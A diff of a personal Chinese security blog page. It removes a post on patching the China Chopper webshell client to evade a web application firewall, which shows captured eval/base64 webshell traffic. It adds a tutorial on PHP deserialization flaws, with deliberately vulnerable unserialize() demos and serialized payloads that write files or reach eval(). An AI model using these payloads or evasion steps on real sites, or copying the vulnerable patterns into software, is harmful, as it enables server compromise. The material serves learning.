@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Bypass菜刀进化成过Waf刀 | 九世的博客</title>
+  <title>php反序列化漏洞学习 | 九世的博客</title>
   <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Bypass菜刀进化成过Waf刀 | 九世的博客">
+  <meta name="description" content="php反序列化漏洞学习 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -1025,9 +1025,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Bypass菜刀进化成过Waf刀" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-php反序列化漏洞学习" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Bypass菜刀进化成过Waf刀</h1>
+        <h1 class="article-title">php反序列化漏洞学习</h1>
     
     <div class="article-meta">
         
@@ -1043,7 +1043,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-21 15:18</time>
+        创建时间:<time class="date" title="更新时间: 2019-09-17 20:24:18">2019-09-17 20:23</time>
         
     </div>
     <div class="article-meta">
@@ -1065,7 +1065,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反序列化漏洞"><span class="toc-text">PHP反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialize"><span class="toc-text">serialize()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize"><span class="toc-text">unserialize()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞的产生"><span class="toc-text">反序列化漏洞的产生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用构造函数"><span class="toc-text">利用构造函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#其他Magic-function的利用"><span class="toc-text">其他Magic function的利用</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#利用普通成员方法"><span class="toc-text">利用普通成员方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞的利用总结"><span class="toc-text">反序列化漏洞的利用总结</span></a></li>
     
 <style>
     .left-col .switch-btn,
@@ -1080,23 +1080,199 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我要在这里大肆吐槽，今天的底层软件好像都在刁难我。首先是用UPX脱壳工具<br>把菜刀脱坏掉了，然后重新下一个。在换一个脱没毛病，用C32asm进行字符替换的时候不给我替换。我特么。。。后面还是用Hxdx64进行替换的，我也是醉了。</p>
-<p><img src="https://i.imgur.com/rPw2ac5.jpg" alt=""></p>
-<pre><code>正式进入贪婪之岛篇！
-</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><pre><code>bypass菜刀教程：https://github.com/admintony/BypassCaiDao
-</code></pre><p>首先你要有把2010年的菜刀，因为16年的菜刀的数据包不同，然后你还需要一些底层工具。</p>
-<pre><code>2010菜刀：链接: https://pan.baidu.com/s/1jvECLJjpsh4OsclZFHkv8g 密码: 6n1h
-吾爱破解工具包：链接：https://pan.baidu.com/s/1nwJg0eX  密码: iuj3
-WSExplorer抓包工具：https://blog.mycike.com/154.html
-</code></pre><p>我们首先把菜刀的UPX壳给脱了，这里我就不说了。自己脱掉就行<br><img src="https://i.imgur.com/m4Tcb1Z.png" alt=""><br>脱壳：</p>
-<p><img src="https://i.imgur.com/993lYUE.png" alt=""></p>
-<p>然后我们启动WSExplorer抓包工具，选择菜刀想进程进行抓包（用菜刀连shell）<br><img src="https://i.imgur.com/FxN5FLd.png" alt=""><br>然后我们可以看到图上抓到的包</p>
-<pre><code>x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7
-</code></pre><p>这里引用文章的解释：</p>
-<pre><code>x 是shell的密码，其中的数据是让shell再接收一个z0
-z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.
-</code></pre><p>然后文章把User-Agent头也改了，这里我就不改了。因为我获取了文件偏移地址但不会转为内存偏移地址（手动滑稽）</p>
-<p>我们直接修改第一个参数数据：<br>首先用C32asm搜索：@eval(base64_decode($<em>POST[z0])); 替换成Dizep,fewi:8chigshi,(cTSWX</em>~4a–?（我这里的C32asm刁难我）<br><img src="https://i.imgur.com/67Pzx2W.png" alt=""><br>用HxDx64来替换<br><img src="https://i.imgur.com/dvYLN4b.jpg" alt=""><br>然后找一个有waf的站来测试，就用我之前过安全狗文件上传的那个站吧<br><img src="https://i.imgur.com/801VXaI.png" alt=""><br>（如果用普通的刀和一句话连的话和上图一样）<br><img src="https://i.imgur.com/eqR09oE.png" alt=""><br>转载请注明转自：422926799.github.io</p>
+        <h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>说到反序列化就要先说序列化，反序列化和序列化都伪造着两个函数来弄。serialize()和unserialize()</p>
+<ul>
+<li>serialize()是用于将类转换为一个字符串</li>
+<li>unserialize()用于将字符串转换回一个类</li>
+</ul>
+<h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><pre><code class="php">&lt;?php
+class test{
+    var $test=&#39;123&#39;;
+}
+$class1=new test;
+$class_ser=serialize($class1);
+echo $class_ser;
+?&gt;
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRdF3D.png" alt=""></p>
+<p>输出结果为：</p>
+<pre><code class="php">O:4:&quot;test&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}
+</code></pre>
+<p>O代表存储的是对象（Object）,4代表名称有4个字符。<code>test</code>表示对象的名称，1表示有一个值，、<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，4表示该变量的名称长度,value:<code>test</code>。3表示变量的值的长度为3,value:<code>123</code>。</p>
+<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>与serialize()对应的，unserialize()可以从序列化后的结果中恢复对象（Object）。</p>
+<pre><code class="php">&lt;?php
+class test{
+    var $test=&#39;123&#39;;
+}
+$class1=new test;
+$class_ser=serialize($class1);
+$data=unserialize($class_ser);
+print_r($data);
+?&gt;
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRwQd1.png" alt=""></p>
+<p>输出结果为：</p>
+<pre><code class="php">test Object ( [test] =&gt; 123 )
+</code></pre>
+<p><code>test</code>为对象，<code>[test]=&gt;123</code>代表<code>$test=&quot;123&quot;</code></p>
+<p>注意：当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</p>
+<h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>当参数传给unserialize()的参数可控时，我们可以通过一个序列化字符串。从而控制对象内部的变量甚至是函数</p>
+<h2 id="利用构造函数"><a href="#利用构造函数" class="headerlink" title="利用构造函数"></a>利用构造函数</h2><p><strong>Magic function</strong></p>
+<p>php中有一类特殊的方法叫做“Magic function”，重点需要关注的</p>
+<ul>
+<li>构造函数__construct()：当对象创建（new）时会自动调用。但在<code>unserialize()</code>时是不会自动调用的</li>
+<li>析构函数__destruct()：当对象被销毁时会自动调用。</li>
+<li>__wakeup()：如前所提，unserialize()时会自动调用</li>
+</ul>
+<p><strong>demo</strong></p>
+<pre><code class="php">&lt;?php
+header(&quot;Content-type: text/html;charset=utf-8&quot;);
+class test{
+    var $test=&#39;123&#39;;
+    function __wakeup(){
+        echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;;
+    }
+    function __construct(){
+        echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;;
+    }
+    function __destruct(){
+        echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;;
+    }
+}
+echo &quot;序列化:&quot;.&quot;&lt;br&gt;&quot;;
+$data=new test;
+$data=serialize($data);
+
+echo &quot;反序列化&quot;.&quot;&lt;br&gt;&quot;;
+$jm=unserialize($data);
+print_r($jm);
+?&gt;
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRrA0J.png" alt=""></p>
+<blockquote>
+<p><strong>wakeup() 或</strong>destruct()由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们</p>
+</blockquote>
+<p>例子：</p>
+<pre><code class="php">&lt;?php
+class chybeta{
+    var $test = &#39;123&#39;;
+    function __wakeup(){
+        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;
+        fwrite($fp,$this-&gt;test);
+        fclose($fp);
+    }
+}
+$class3 = $_GET[&#39;test&#39;];
+print_r($class3);
+echo &quot;&lt;/br&gt;&quot;;
+$class3_unser = unserialize($class3);
+require &quot;shell.php&quot;;
+// 为显示效果，把这个shell.php包含进来
+?&gt;
+</code></pre>
+<p>通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：</p>
+<pre><code class="php">&lt;?php
+class chybeta{
+    var $test = &#39;123&#39;;
+    function __wakeup(){
+        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;
+        fwrite($fp,$this-&gt;test);
+        fclose($fp);
+    }
+}
+$data=new chybeta();
+$data-&gt;test=&#39;&lt;?php phpinfo()?&gt;&#39;;
+$data_ser=serialize($data);
+echo $data_ser;
+?&gt;
+</code></pre>
+<p>结果为</p>
+<pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}
+</code></pre>
+<p>当把序列化后的字符串放入到test的传参中，就会造成RCE</p>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRsbZQ.png" alt=""></p>
+<h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的<strong>construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的</strong>wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p>
+<pre><code class="php">&lt;?php
+class ph0en1x{
+    function __construct($test){
+        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;
+        fwrite($fp,$test);
+        fclose($fp);
+    }
+}
+class chybeta{
+    var $test = &#39;123&#39;;
+    function __wakeup(){
+        $obj = new ph0en1x($this-&gt;test);
+    }
+}
+$class5 = $_GET[&#39;test&#39;];
+print_r($class5);
+echo &quot;&lt;/br&gt;&quot;;
+$class5_unser = unserialize($class5);
+require &quot;shell.php&quot;;
+?&gt;
+
+</code></pre>
+<p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <strong>wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的</strong>construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 shell.php中</p>
+<pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}
+
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRgNy6.png" alt=""></p>
+<h2 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h2><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p>
+<pre><code class="php">&lt;?php
+class chybeta {
+    var $test;
+    function __construct() {
+        $this-&gt;test= new ph0en1x(); //实例化ph0en1x
+    }
+    function __destruct() {
+        $this-&gt;test-&gt;action(); //调用ph0en1x类里的action()函数
+    }
+}
+class ph0en1x {
+    function action() {
+        echo &quot;ph0en1x&quot;;
+    }
+}
+class ph0en2x {
+    var $test2;
+    function action() {
+        eval($this-&gt;test2);
+    }
+}
+$class6 = new chybeta();
+unserialize($_GET[&#39;test&#39;]);
+?&gt;
+
+</code></pre>
+<p>payload修改为：</p>
+<pre><code class="php">&lt;?php
+class chybeta {
+    var $test;
+    function __construct() {
+        $this-&gt;test=new ph0en2x(); //实例化ph0en1x
+    }
+}
+class ph0en2x {
+    var $test2=&quot;phpinfo();&quot;;
+}
+$class6 = new chybeta();
+$payload=serialize($class6);
+echo $payload;
+
+</code></pre>
+<p>最后得到的序列化字串</p>
+<pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}
+
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/16/nRfWgs.png" alt=""></p>
+<h2 id="反序列化漏洞的利用总结"><a href="#反序列化漏洞的利用总结" class="headerlink" title="反序列化漏洞的利用总结"></a>反序列化漏洞的利用总结</h2><ul>
+<li>搜索关键词serialize()和unserialize()</li>
+<li>详细审计有调用以上函数的代码和调用这个函数的上面的类</li>
+<li>详细审计类</li>
+</ul>
+<p>参考链接：<a href="https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1106,12 +1282,12 @@ z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并�
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Bypass菜刀进化成过Waf刀</p>
+    <p><span class="copy-title">文章标题:</span>php反序列化漏洞学习</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-21, 15:18:03</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ec776b6d.html" title="Bypass菜刀进化成过Waf刀">http://422926799.github.io/posts/ec776b6d.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-17, 20:23:13</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-17, 20:24:18</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/573dfd6f.html" title="php反序列化漏洞学习">http://422926799.github.io/posts/573dfd6f.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
